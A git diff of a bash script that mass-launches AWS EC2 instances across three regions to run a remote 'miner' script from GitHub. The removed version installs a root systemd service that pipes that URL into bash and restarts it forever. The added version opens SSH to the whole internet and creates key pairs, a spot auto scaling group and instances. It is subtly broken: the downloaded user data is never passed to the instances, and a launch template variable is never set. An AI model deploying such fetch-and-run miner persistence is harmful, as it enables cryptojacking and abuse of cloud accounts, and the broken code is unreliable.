@@ -1,84 +1,115 @@
+
 #!/bin/bash
 
-# Kiểm tra nếu không chạy với quyền root thì tự động chuyển sang root
-if [[ $EUID -ne 0 ]]; then
-    echo "⚠️ Script chưa chạy với quyền root. Chuyển sang root..."
-    exec sudo bash "$0" "$@"
+# List of regions and corresponding AMI IDs
+declare -A region_image_map=(
+    ["us-east-1"]="ami-0e2c8caa4b6378d8c"
+    ["us-west-2"]="ami-05d38da78ce859165"
+    ["us-east-2"]="ami-0cb91c7de36eed2cb"
+)
+
+# URL containing User Data on GitHub
+user_data_url="https://raw.githubusercontent.com/hieudv194/miner/refs/heads/main/viauto"
+
+# Path to User Data file
+user_data_file="/tmp/user_data.sh"
+
+# Download User Data from GitHub
+echo "Downloading user-data from GitHub..."
+curl -s -L "$user_data_url" -o "$user_data_file"
+
+# Check if file exists and is not empty
+if [ ! -s "$user_data_file" ]; then
+    echo "Error: Failed to download user-data from GitHub."
+    exit 1
 fi
 
-# Danh sách vùng AWS cần thay đổi instance
-REGIONS=("us-east-1" "us-west-2" "us-east-2")
+# Encode User Data to base64 for AWS use
+user_data_base64=$(base64 -w 0 "$user_data_file")
 
-# Hàm cập nhật instance type mới
-get_new_instance_type() {
-    case "$1" in
-        "c7a.large") echo "c7a.2xlarge" ;;
-        *) echo "c7a.2xlarge" ;; # Mặc định nếu không xác định được
-    esac
-}
+# Iterate over each region
+for region in "${!region_image_map[@]}"; do
+    echo "Processing region: $region"
 
-# Lặp qua từng vùng để dừng và thay đổi instance type
-for REGION in "${REGIONS[@]}"; do
-    echo "🔹 Đang xử lý vùng: $REGION"
+    # Get the image ID for the region
+    image_id=${region_image_map[$region]}
 
-    # Lấy danh sách Instance ID trong vùng
-    INSTANCE_IDS=$(aws ec2 describe-instances --region "$REGION" --query "Reservations[*].Instances[*].InstanceId" --output text)
+    # Check if Key Pair exists
+    key_name="keyname01-$region"
+    if aws ec2 describe-key-pairs --key-names "$key_name" --region "$region" > /dev/null 2>&1; then
+        echo "Key Pair $key_name already exists in $region"
+    else
+        aws ec2 create-key-pair \
+            --key-name "$key_name" \
+            --region "$region" \
+            --query "KeyMaterial" \
+            --output text > "${key_name}.pem"
+        chmod 400 "${key_name}.pem"
+        echo "Key Pair $key_name created in $region"
+    fi
 
-    if [ -z "$INSTANCE_IDS" ]; then
-        echo "⚠️ Không có instance nào trong vùng $REGION."
+    # Check if Security Group exists
+    sg_name="Random-$region"
+    sg_id=$(aws ec2 describe-security-groups --group-names "$sg_name" --region "$region" --query "SecurityGroups[0].GroupId" --output text 2>/dev/null)
+
+    if [ -z "$sg_id" ]; then
+        sg_id=$(aws ec2 create-security-group \
+            --group-name "$sg_name" \
+            --description "Security group for $region" \
+            --region "$region" \
+            --query "GroupId" \
+            --output text)
+        echo "Security Group $sg_name created with ID $sg_id in $region"
+    else
+        echo "Security Group $sg_name already exists with ID $sg_id in $region"
+    fi
+
+    # Ensure SSH (22) port is open
+    if ! aws ec2 describe-security-group-rules --region "$region" --filters Name=group-id,Values="$sg_id" Name=ip-permission.from-port,Values=22 Name=ip-permission.to-port,Values=22 Name=ip-permission.cidr,Values=0.0.0.0/0 > /dev/null 2>&1; then
+        aws ec2 authorize-security-group-ingress \
+            --group-id "$sg_id" \
+            --protocol tcp \
+            --port 22 \
+            --cidr 0.0.0.0/0 \
+            --region "$region"
+        echo "SSH (22) access enabled for Security Group $sg_name in $region"
+    else
+        echo "SSH (22) access already configured for Security Group $sg_name in $region"
+    fi
+
+    # Automatically select an available Subnet ID for Auto Scaling Group
+    subnet_id=$(aws ec2 describe-subnets --region $region --query "Subnets[0].SubnetId" --output text)
+
+    if [ -z "$subnet_id" ]; then
+        echo "No available Subnet found in $region. Skipping region."
         continue
     fi
 
-    # Dừng tất cả instances trong vùng
-    echo "🛑 Dừng tất cả instances trong vùng $REGION..."
-    aws ec2 stop-instances --instance-ids $INSTANCE_IDS --region "$REGION"
-    aws ec2 wait instance-stopped --instance-ids $INSTANCE_IDS --region "$REGION"
+    echo "Using Subnet ID $subnet_id for Auto Scaling Group in $region"
 
-    # Thay đổi instance type
-    for INSTANCE in $INSTANCE_IDS; do
-        CURRENT_TYPE=$(aws ec2 describe-instances --instance-ids "$INSTANCE" --region "$REGION" --query "Reservations[*].Instances[*].InstanceType" --output text)
-        NEW_TYPE=$(get_new_instance_type "$CURRENT_TYPE")
+    # Create Auto Scaling Group with selected Subnet ID
+    asg_name="SpotASG-$region"
+    aws autoscaling create-auto-scaling-group \
+        --auto-scaling-group-name $asg_name \
+        --launch-template "LaunchTemplateId=$launch_template_id,Version=1" \
+        --min-size 1 \
+        --max-size 10 \
+        --desired-capacity 1 \
+        --vpc-zone-identifier "$subnet_id" \
+        --region $region
+    echo "Auto Scaling Group $asg_name created in $region"
 
-        echo "🔄 Đổi instance $INSTANCE từ $CURRENT_TYPE ➝ $NEW_TYPE"
-        aws ec2 modify-instance-attribute --instance-id "$INSTANCE" --instance-type "{\"Value\": \"$NEW_TYPE\"}" --region "$REGION"
-    done
+    # Launch 1 On-Demand EC2 Instance
+    instance_id=$(aws ec2 run-instances \
+        --image-id "$image_id" \
+        --count 1 \
+        --instance-type c7a.large \
+        --key-name "$key_name" \
+        --security-group-ids "$sg_id" \
+        --region "$region" \
+        --query "Instances[0].InstanceId" \
+        --output text)
 
-    # Khởi động lại instances
-    echo "🚀 Khởi động lại tất cả instances trong vùng $REGION..."
-    aws ec2 start-instances --instance-ids $INSTANCE_IDS --region "$REGION"
+    echo "On-Demand Instance $instance_id created in $region using Key Pair $key_name and Security Group $sg_name"
 
 done
-
-echo "✅ Hoàn tất thay đổi instance type cho tất cả vùng!"
-
-# ------------------------------
-# 🛠️ Cấu Hình Tự Động Chạy Sau Khi Khởi Động Lại
-# ------------------------------
-
-USER_DATA_URL="https://raw.githubusercontent.com/hieudv194/miner/refs/heads/main/viauto"
-
-# Chờ hệ thống khởi động hoàn tất
-echo "⏳ Chờ hệ thống khởi động hoàn tất..."
-sleep 300
-
-# Tạo systemd service để tải & chạy script mỗi khi máy khởi động lại
-cat <<EOF > /etc/systemd/system/miner.service
-[Unit]
-Description=Auto-run Miner Script
-After=network.target
-
-[Service]
-ExecStart=/bin/bash -c 'curl -s -L "$USER_DATA_URL" | bash'
-Restart=always
-User=root
-
-[Install]
-WantedBy=multi-user.target
-EOF
-
-# Reload systemd và kích hoạt service
-systemctl daemon-reload
-systemctl enable miner
-systemctl start miner
-
-echo "✅ Cấu hình tự động chạy script sau khi khởi động lại thành công!"
